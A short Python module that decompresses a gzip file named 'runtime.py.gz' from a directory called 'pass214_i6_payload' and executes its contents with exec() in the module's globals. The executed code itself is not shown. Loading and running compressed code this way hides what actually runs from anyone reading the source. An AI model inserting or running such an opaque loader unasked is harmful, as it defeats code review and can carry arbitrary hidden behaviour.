from __future__ import annotations

import gzip
from pathlib import Path

_PAYLOAD = Path(__file__).with_name("pass214_i6_payload") / "runtime.py.gz"
exec(compile(gzip.decompress(_PAYLOAD.read_bytes()), str(_PAYLOAD), "exec"), globals(), globals())
